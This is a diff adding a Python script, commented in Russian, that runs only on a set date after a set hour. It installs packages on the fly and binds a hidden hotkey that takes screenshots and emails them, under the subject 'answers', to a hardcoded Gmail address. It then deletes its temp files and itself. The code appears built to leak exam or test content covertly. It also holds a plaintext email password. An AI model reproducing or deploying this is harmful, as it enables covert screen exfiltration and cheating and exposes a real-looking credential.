@@ -1,0 +1,89 @@
+# -*- coding: utf-8 -*-
+
+from os import system as command
+from os.path import basename, abspath
+from os import remove
+from sys import executable
+from tempfile import mkdtemp
+from shutil import rmtree
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
+import smtplib
+
+try:
+    from pyautogui import screenshot
+    from keyboard import add_hotkey, wait
+except (ModuleNotFoundError, ImportError):
+    print("Installing packages...")
+    command("%s -m pip install pyautogui" % executable)
+    command("%s -m pip install keyboard" % executable)
+
+
+DATE = "04-01"  # Дата работы
+HOUR = 13  # Час, ПОСЛЕ которого программа будет работать (должно хватить для моей группы)
+DESTINATION = "pavel.sedoykin7@gmail.com"  # Адрес почты, куда сливать
+
+START = "pavel.sedoykin@outlook.com"
+_SMTP = "outlook"
+PASSWORD = "pav@sed&2007@11@15"
+CHECK = True
+
+
+class MailControl:
+
+    def __init__(self, temp, start, dest, _smtp, password):
+        self.temp = temp
+        self.start = start
+        self.dest = dest
+        self._smtp = _smtp
+        self.password = password
+        self.number = 0
+
+        self.connection = smtplib.SMTP("smtp.%s.com:587" % self._smtp)
+        self.connection.ehlo()
+        self.connection.starttls()
+        self.connection.ehlo()
+        self.connection.login(self.start, self.password)
+
+    def send_shot(self):
+        fl = (self.temp + "\\scr%s.png" % self.number)
+        screenshot().save(fl)
+        with open(fl, "rb") as picture:
+            img_data = picture.read()
+
+        msg = MIMEMultipart()
+        msg['Subject'] = 'answers'
+        msg['From'] = self.start
+        msg['To'] = self.dest
+
+        text = MIMEText("Picture number %s" % (self.number + 1))
+        msg.attach(text)
+        image = MIMEImage(img_data, name=basename(fl))
+        msg.attach(image)
+
+        self.connection.sendmail(self.start, self.dest, msg.as_string())
+        self.number += 1
+
+    def quit(self):
+        self.connection.quit()
+
+
+if __name__ == '__main__':
+    now = datetime.now()
+    hr = now.hour
+    if (str(now.date())[5:] != DATE or hr < HOUR) and CHECK:
+        exit(0)
+
+    temp_dir = mkdtemp()
+    print(temp_dir)
+    mail_obj = MailControl(temp_dir, START, DESTINATION, _SMTP, PASSWORD)
+
+    add_hotkey('right shift+right ctrl', lambda: mail_obj.send_shot())
+    wait("left ctrl+left alt")
+    print("done")
+
+    mail_obj.quit()
+    rmtree(temp_dir)
+    remove(abspath(__file__))
